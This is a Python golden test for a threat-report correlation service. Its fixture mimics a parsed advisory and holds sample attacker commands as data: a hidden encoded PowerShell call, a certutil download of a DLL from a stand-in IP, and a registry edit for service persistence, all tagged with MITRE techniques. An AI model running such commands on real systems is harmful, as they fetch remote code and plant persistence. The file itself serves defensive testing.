"""T1-E · ICE ``correlate`` incident golden.

Freezes the incident summary object produced by
``services.ice.correlate.correlate()`` for a deterministic SSOT
payload.  This is the authoritative cross-source semantic reunification
layer that Stage 1 must NOT modify.
"""
from __future__ import annotations

import sys
from pathlib import Path

_BACKEND = Path(__file__).resolve().parents[3]
if str(_BACKEND) not in sys.path:
    sys.path.insert(0, str(_BACKEND))

from tests.canonical.stage1_goldens._harness import compare_or_capture


def _fixture_ssot():
    return {
        "input": {"raw": "https://test.example.gov/advisory/t1e"},
        "understanding": {"input_type": "threat_report_url",
                           "confidence": 0.9},
        "document_profile": {"vendor": "Test", "title": "T1E Advisory"},
        "acquired_document": {"ok": True,
                                "url": "https://test.example.gov/advisory/t1e"},
        "report_extraction": {
            "commands": [
                {"normalized_command":
                    "powershell -nop -w hidden -enc SGVsbG8=",
                 "mitre": ["T1059.001", "T1027"],
                 "tactic": "execution",
                 "purpose": "PowerShell encoded command",
                 "language": "powershell"},
                {"normalized_command":
                    "certutil.exe -f urlcache http://198.51.100.20/x.dll x.dll",
                 "mitre": ["T1105", "T1059.003"],
                 "tactic": "command_and_control",
                 "purpose": "Certutil URL-cache abuse",
                 "language": "cmd"},
                {"normalized_command":
                    "reg add HKLM\\System /v Start /t REG_DWORD /d 2 /f",
                 "mitre": ["T1543.003"],
                 "tactic": "persistence",
                 "purpose": "Service persistence",
                 "language": "cmd"},
            ],
            "mitre_techniques": [
                {"id": "T1059.001", "name": "PowerShell",
                 "tactic": "execution"},
                {"id": "T1027", "name": "Obfuscated Files or Information",
                 "tactic": "defense_evasion"},
                {"id": "T1105", "name": "Ingress Tool Transfer",
                 "tactic": "command_and_control"},
                {"id": "T1543.003", "name": "Windows Service",
                 "tactic": "persistence"},
            ],
            "body_artifacts": [
                {"type": "url", "value": "http://198.51.100.20/x.dll"},
                {"type": "ip", "value": "198.51.100.20"},
            ],
            "threat_actors": [{"name": "TestActor"}],
            "malware_families": [{"name": "TestFamily"}],
            "behaviors": [{"name": "downloader"},
                          {"name": "persistence"}],
        },
    }


def _freeze_incident(incident: dict) -> dict:
    """Keep only the contract-critical keys.  ICE emits many fields;
    Stage 1 protects the ones downstream projections read."""
    if not incident:
        return {}
    return {k: incident.get(k) for k in (
        "id", "title", "vendor", "actor", "malware", "objective",
        "severity", "confidence", "readiness",
    )}


def test_t1_e_ice_incident_golden():
    from services.ice.correlate import correlate
    ssot = _fixture_ssot()
    ice_out = correlate(ssot) or {}
    incident_block = ice_out.get("incident") or {}
    summary = incident_block.get("summary") or {}
    frozen = {
        "summary": _freeze_incident(summary),
        "phases_count": len(incident_block.get("phases") or []),
        "mitre_technique_count": len(
            (incident_block.get("mitre") or {}).get("techniques") or []
        ),
        "behavior_cluster_count": len(
            incident_block.get("behaviors") or []
        ),
    }
    compare_or_capture("t1_e_ice_incident", frozen)


def test_t1_e_ice_incident_severity_and_confidence_deterministic():
    """Same SSOT twice → identical severity + confidence.  ICE is
    deterministic by contract; this guards against silent nondeterminism
    introduced by any Stage-1 wiring downstream of correlation."""
    from services.ice.correlate import correlate
    ssot = _fixture_ssot()
    a = ((correlate(ssot) or {}).get("incident") or {}).get("summary") or {}
    b = ((correlate(ssot) or {}).get("incident") or {}).get("summary") or {}
    assert a.get("severity") == b.get("severity")
    assert a.get("confidence") == b.get("confidence")
    assert a.get("objective") == b.get("objective")
